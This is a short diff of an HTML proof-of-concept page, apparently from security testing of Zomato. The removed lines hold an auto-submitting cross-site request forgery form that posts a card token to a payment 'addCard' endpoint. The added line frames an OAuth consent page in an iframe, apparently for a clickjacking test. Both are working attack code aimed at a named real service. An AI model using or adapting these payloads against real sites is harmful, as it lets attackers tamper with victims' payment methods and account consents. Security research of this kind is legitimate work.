@@ -4,16 +4,6 @@
   <title>CSRF PoC - addCard</title>
 </head>
 <body>
-  <h3>CSRF PoC: zpaykit/addCard</h3>
-  <form id="csrf-poc" action="https://www.zomato.com/zpaykit/addCard" method="POST">
-    <input type="hidden" name="vault" value="winecellar">
-    <input type="hidden" name="country_id" value="1">
-    <input type="hidden" name="service_type" value="TR">
-    <input type="hidden" name="card_name" value="korban">
-    <input type="hidden" name="card_token" value="OtAH5ynBxGSdvdnVqxfk87wPQpySBAsx">
-  </form>
-  <script>
-    document.getElementById('csrf-poc').submit();
-  </script>
+ <iframe src="https://accounts.zomato.com/zoauth/consent?consent_challenge=6017283e719e4aed80fc7df13bc3907b"></iframe>
 </body>
 </html>
